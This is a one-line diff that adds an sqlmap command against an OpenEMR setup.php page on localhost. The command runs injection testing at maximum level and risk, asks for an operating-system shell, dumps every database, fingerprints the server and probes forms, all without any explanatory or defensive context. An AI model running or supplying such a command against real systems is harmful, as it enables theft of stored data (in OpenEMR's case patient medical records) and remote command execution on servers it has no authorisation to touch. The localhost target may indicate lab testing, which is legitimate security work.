@@ -1,0 +1,1 @@
+sqlmap.py -u "http://localhost/openemr/setup.php?site=default" --dbms=mysql  --level=5 --risk=3 -v 5  --os-shell   --common-tables --common-columns  --hpp --threads=10 -f -a -b --dump-all   --comments  --forms --beep
